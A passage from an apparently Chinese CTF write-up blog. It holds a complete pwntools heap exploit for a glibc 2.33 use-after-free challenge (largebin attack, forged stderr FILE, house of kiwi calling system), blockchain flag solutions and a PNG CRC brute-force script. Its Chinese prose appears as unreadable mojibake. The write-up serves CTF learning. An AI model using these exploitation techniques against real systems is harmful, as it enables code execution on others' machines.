a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          edit(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1047</span> &amp;&amp; v1 &lt;= <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">    qword_4060[v2] = buf;</span><br><span class="line">    dword_40E0[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  result = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v2], (<span class="keyword">int</span>)dword_40E0[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v1 = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_4060[v3]);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;qword_4060 + v0) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;qword_4060 + v0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯é«˜ç‰ˆæœ¬ï¼ˆ2.33ï¼‰çš„UAFï¼Œæœ€å°ç”³è¯·0x417å¤§å°çš„chunkï¼›</p><p>å…ˆç”¨è´Ÿidxä¿®æ”¹stderræŒ‡é’ˆï¼Œå†åˆ©ç”¨LargeBin Attackä¿®æ”¹__pointer_chk_guardï¼Œä¼ªé€ stderrä¿®æ”¹vtableï¼Œæœ€åæ”¹topchunkè§¦å‘house of kiwiã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = (u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">16</span>) - libc.sym.__malloc_hook - <span class="number">0x71</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x470</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">heap_base = heap_addr - <span class="number">0x290</span></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1e3e78</span></span><br><span class="line">stderr_chain = libc_base + <span class="number">0x1e1648</span></span><br><span class="line">__pointer_chk_guard = libc_base + <span class="number">0x1ed5b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__pointer_chk_guard))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1e1000</span>)*<span class="number">2</span> + p64(heap_addr) + p64(__pointer_chk_guard-<span class="number">0x20</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x480</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>) </span><br><span class="line"></span><br><span class="line">target = libc_base + libc.sym.system</span><br><span class="line">io_cookie_jumps = libc_base + <span class="number">0x1e1a20</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0x00000000fbad2087</span>)+<span class="number">3</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE += p64(libc_base + <span class="number">0x1e3660</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(io_cookie_jumps + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base + <span class="number">0x300</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(target ^ (heap_base+<span class="number">0xb30</span>),<span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">4</span>,<span class="number">0x500</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x700</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x508</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xff0</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="Where-the-flagï¼Ÿ"><a href="#Where-the-flagï¼Ÿ" class="headerlink" title="Where the flagï¼Ÿ"></a>Where the flagï¼Ÿ</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract find&#123;</span><br><span class="line">    uint96 private a=7855;</span><br><span class="line">    address private owner=msg.sender;</span><br><span class="line">    bool private f=false;</span><br><span class="line">    bool private t=true;</span><br><span class="line">    string[] private flag=[flag1,flag2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc</span><br></pre></td></tr></table></figure></blockquote><p>åº”è¯¥æ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥åˆçº¦ï¼Œåœ¨äº¤æ˜“0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1çš„InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagä¸¤æˆªå­—ç¬¦ä¸²ï¼š<code>Dest0g3&#123;0n1y_u5e_priv4t3_i</code>ï¼Œ<code>5_n0t_s4f3_1n_B1okCh4in!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Easy-predict"><a href="#Easy-predict" class="headerlink" title="Easy predict"></a>Easy predict</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">contract storageplace&#123;</span><br><span class="line">     mapping(uint=&gt;string)private _flag;</span><br><span class="line">     address owner;</span><br><span class="line">     constructor()public&#123;     </span><br><span class="line">     owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function flag() public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint number) public returns(bytes1)&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract question&#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;bool)public regeister;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;uint)private seed;</span><br><span class="line">    </span><br><span class="line">    uint constant Price_Per_Char=10 ether;</span><br><span class="line">    </span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    storageplace immutable Flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        </span><br><span class="line">        storageplace _Flag = new storageplace();</span><br><span class="line">        </span><br><span class="line">        Flag = _Flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isowner()&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;I think you are not the rignt person&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function removeRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function regeist() public &#123;</span><br><span class="line">        require(regeister[msg.sender]==false);</span><br><span class="line">        regeister[msg.sender]=true;</span><br><span class="line">        seed[msg.sender]=block.number+1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyflag(uint want) public payable returns(bytes1)&#123;</span><br><span class="line">        require(msg.value==Price_Per_Char,&quot;is not free&quot;);</span><br><span class="line">        return Flag.buy(want);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function query(bytes32 answer) public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(regeister[msg.sender]);</span><br><span class="line">        require(block.number &gt;seed[msg.sender],&quot;too early&quot;);</span><br><span class="line">        bytes32 result = blockhash(seed[msg.sender]);</span><br><span class="line">        require(answer==result,&quot;wrong answer&quot;);</span><br><span class="line">        return Flag.flag();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925</span><br></pre></td></tr></table></figure></blockquote><p>ä¹Ÿæ˜¯éé¢„æœŸï¼Œè®¿é—®urlè¿›å…¥äº¤æ˜“0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925ï¼Œåœ¨InputDataé‡Œï¼Œå¯ä»¥æŸ¥çœ‹åˆ°Hexæ•°æ®ï¼Œè½¬å­—ç¬¦ä¸²å¯å¾—åˆ°flagäº”æˆªå­—ç¬¦ä¸²ï¼š<code>Dest0g3&#123;t</code>ï¼Œ<code>_sup3r_e3</code>ï¼Œ<code>hi5_1s_4</code>ï¼Œ<code>ea5y_p</code>ï¼Œ<code>_r1ght?&#125;</code>ï¼ŒæŒ‰è‹±æ–‡å­—é¢æ„æ€æ‹¼æ¥ï¼Œå¾—ï¼š<code>Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><blockquote><p>OCR is very useful in ctfï¼</p></blockquote><p>æ›´åƒMiscçš„AIé¢˜ï¼Œpngå›¾ç‰‡æ‰­æ›²ï¼Œåº”è¯¥å®½åº¦ä¸å¯¹ï¼ŒCRCå€¼çˆ†ç ´å®½é«˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;flag_pic.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ­£å¸¸å›¾ç‰‡ï¼š</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/flag2.png" alt="flag2" style="zoom:50%;"></p><p>æ‰¾ä¸ªåœ¨çº¿OCRè¯†åˆ«å›¾é‡Œå­—ç¬¦ï¼Œå¾—åˆ°çš„ç»“æœæœ‰éƒ¨åˆ†å­—ç¬¦ä¸æ­£ç¡®ï¼Œæ‰‹åŠ¨ä¿®æ­£ï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>ä»¥Hexä¿å­˜ä¸º7zå‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹å¾—åˆ° 